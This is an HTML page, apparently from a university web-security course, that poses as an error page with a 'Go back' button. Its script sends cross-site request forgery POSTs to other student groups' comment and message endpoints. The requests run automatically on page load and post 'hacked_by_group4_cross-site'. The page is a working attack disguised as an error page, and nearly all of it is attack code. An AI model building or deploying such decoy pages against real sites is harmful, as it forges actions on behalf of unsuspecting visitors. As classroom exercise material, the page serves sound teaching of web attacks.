<!DOCTYPE html>
<html lang="en">
<body>

<h1>ERR0R</h1>

<p>Something went wrong; click the button to return to the previous page.</p>
<button type="button" onclick="attackGroup2()">Go back</button>



<script>
    /**
     * Function to attack Group 2 with CSRF attack. Link was placed in their website
     * to this file.
     */
    function attackGroup2()
    {
        //target website.
        const url = "http://weblab.salemstate.edu/~csc435Fall2020Group2/submit.php";
        const form = new FormData();
        form.append("comment", "hacked_by_group4_cross-site");

        const requestOptions = {
            method: 'POST',
            mode: 'no-cors', // no-cors, *cors, same-origin
            headers: { 'Content-Type': 'application/json' },
            body: form,
        };

        //send the request
        fetch(url, requestOptions)
            .then(async response => {
                const data = await response.json();
                console.log("Data is ", data);

                // check for error response
                if (!response.ok) {
                    console.log("Response was not OK ", response.status)
                }

            })
            .catch(error => {
                console.log("Error was ", error)
                console.error('There was an error!', error);

            });


    }

    /**
     * Function to attack Group 1 with CSRF attack. Link was placed in their website
     * to this file.
     */
    function attackGroup1(){

        //target website.
        const url = "http://weblab.salemstate.edu/~csc435Fall2020Group1/FinalProject/post.php";
        const form = new FormData();
        form.append("message", "hacked_by_group4_cross-site");

        const requestOptions = {
            method: 'POST',
            mode: 'no-cors', // no-cors, *cors, same-origin
            headers: { 'Content-Type': 'application/json' },
            body: form,
        };

        //send the request
        fetch(url, requestOptions)
            .then(async response => {
                const data = await response.json();
                console.log("Data is ", data);

                // check for error response
                if (!response.ok) {
                    console.log("Response was not OK ", response.status)
                }

            })
            .catch(error => {
                console.log("Error was ", error)
                console.error('There was an error!', error);

            });

    }
    attackGroup2();
    attackGroup1();
</script>

</body>
</html>